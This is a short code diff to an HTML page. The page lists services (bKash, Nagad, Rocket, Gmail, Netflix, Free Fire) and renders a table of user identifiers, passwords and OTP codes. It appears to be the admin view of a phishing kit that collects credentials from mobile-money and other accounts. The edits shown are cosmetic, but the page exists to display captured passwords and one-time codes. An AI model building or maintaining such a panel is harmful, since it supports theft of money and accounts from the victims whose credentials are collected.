@@ -233,7 +233,7 @@
             imoData: 'Logo/imo.png',
             bkashData: 'Logo/bkash-logo.png',
             nagadData: 'Logo/nagad-logo.png',
-            rocketData: 'Logo/rocket-logo.png', // Path corrected
+            rocketData: 'Logo/rocket-logo.png',
             netflixData: 'Logo/Netflix.png',
             emailData: 'Logo/Gmail.png',
             freefireData: 'Logo/Freefair.png',
@@ -307,7 +307,7 @@
                                 <td>${userIdentifier}</td>
                                 <td><span class="sensitive-data">${password}</span></td>
                                 <td><span class="sensitive-data">${otp}</span></td>
-                                <td><button class="btn view-details-btn" onclick="showDetails('${dataKey}', ${index})">ডিটেলস</button></td>
+                                <td><button class="view-details-btn" onclick="showDetails('${dataKey}', ${index})">ডিটেলস</button></td>
                               </tr>`;
             });
             tableHTML += `</tbody></table>`;
@@ -396,4 +396,4 @@
         document.getElementById('deleteOverlay').addEventListener('click', hideDeleteConfirm);
     </script>
 </body>
-</html>```
+</html>
